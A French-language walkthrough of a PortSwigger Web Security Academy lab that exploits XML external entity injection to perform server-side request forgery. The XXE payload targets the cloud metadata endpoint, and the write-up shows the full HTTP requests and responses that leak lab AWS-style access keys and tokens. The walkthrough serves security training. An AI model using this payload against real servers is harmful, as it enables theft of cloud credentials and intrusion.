# Lab

https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf

## Solution

On peut commencer par injecter une payload pour appeler l'URL `http://169.254.169.254/` :

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
               1
    </storeId>
</stockCheck>
```

On obtient en réponse :

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 42

"Invalid product ID: latest"
```

On peut construire l'URL en ajoutant la réponse : `http://169.254.169.254/latest`

On obtient un autre mot clé intéressant : `meta-data` et on continue jusqu'à arriver à l'URL finale `http://169.254.169.254/latest/meta-data/iam/security-credentials/admin`.

```http
POST /product/stock HTTP/2
Host: 0a0b009304ba771d82a3ca810009002a.web-security-academy.net
Cookie: session=MsSTpDonanfV8wuM5h5AdBGaZiQbESsy
Content-Length: 280
Sec-Ch-Ua: "Chromium";v="117", "Not;A=Brand";v="8"
Sec-Ch-Ua-Platform: "Windows"
Sec-Ch-Ua-Mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.132 Safari/537.36
Content-Type: application/xml
Accept: */*
Origin: https://0a0b009304ba771d82a3ca810009002a.web-security-academy.net
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: https://0a0b009304ba771d82a3ca810009002a.web-security-academy.net/product?productId=1
Accept-Encoding: gzip, deflate, br
Accept-Language: en-US,en;q=0.9

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/admin"> ]>
<stockCheck>
    <productId>
        &xxe;
    </productId>
    <storeId>
               1
    </storeId>
</stockCheck>
```

```http
HTTP/2 400 Bad Request
Content-Type: application/json; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 566

"Invalid product ID: 
        {
  "Code" : "Success",
  "LastUpdated" : "2023-10-14T18:13:46.816451232Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "nouYWzLQLfwwuDmifzEH",
  "SecretAccessKey" : "9T5q8gVVHalDl8lXffGha7QFeyxZtUfZFtSOc7cJ",
  "Token" : "L905eWMsH7WXYMqn7PnTp0tALg0LzHWDDZhKbTkscTPZmRE7bBWSjEKXRDT6pYFiRQAk2RtYPILBqV3uSUOWyr1NdYpfRgB8F6fZpW8W7W7FiHM1ZgHEaZgf0WKjrVMlFPEjLvlxkeM32cRrNnFg9OxF2Z9DuttdHMTEn4yBvFBVlB6WStY8dRXijYsxwaBZSebyjX0HTo1hAiLM1fCFOlbsHUBdlPvY19THIkbJhrLHdz9JfD6JkoypWSzRCGP7",
  "Expiration" : "2029-10-12T18:13:46.816451232Z"
}
"
```